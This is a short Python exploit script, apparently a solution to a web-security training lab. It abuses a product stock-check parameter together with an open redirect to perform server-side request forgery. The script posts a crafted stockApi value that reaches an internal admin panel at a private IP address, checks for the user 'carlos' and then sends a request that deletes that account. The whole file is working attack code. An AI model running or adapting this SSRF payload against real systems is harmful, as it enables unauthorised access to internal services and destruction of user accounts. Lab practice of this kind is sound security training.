import requests
import sys
import urllib3
urllib3.disable_warnings()



try:
    url=sys.argv[1]

except IndexError:
    print(f"[+] Syntax : python3 {sys.argv[0]} <url>")


if __name__=='__main__':
    path='/product/stock'
    s=requests.Session()
    content={'Content-Type': 'application/x-www-form-urlencoded'}
    res={
        'stockApi':'/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin'
    }
    r=s.post(url+path,headers=content,data=res)
    if r:
        print("[+] Access")
        if 'carlos' in r.text:
            print('[%] Delete carlos user ..')
            res['stockApi']+="/delete?username=carlos"
            r=s.post(url+path,headers=content,data=res)
            print('[+] Complete ')
        else:
            print('[-] No carlos HERE')
    else:
        print('[-] Not Found')

    